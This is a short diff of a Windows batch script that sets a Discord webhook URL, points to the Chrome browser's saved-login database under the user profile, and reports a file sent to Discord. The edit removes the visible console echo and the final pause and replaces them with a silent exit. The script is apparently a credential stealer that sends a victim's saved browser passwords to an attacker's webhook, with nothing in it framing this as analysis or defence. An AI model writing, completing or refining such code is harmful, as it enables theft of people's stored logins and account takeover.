@@ -1,5 +1,3 @@
-@echo off
-
 set "webhook_url=https://discord.com/api/webhooks/1177006144699506749/JBM_hoiJARsgmCcDM_Z1rptaRqAPYEQcbJ1fqHbeVV70qcf-ILivPgdwgcfs8-hVA5Ba"
 set "chrome_login_data=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 
@@ -12,4 +10,4 @@ if %errorlevel% neq 0 (
     echo File sent successfully to Discord.
 )
 
-pause
+exit
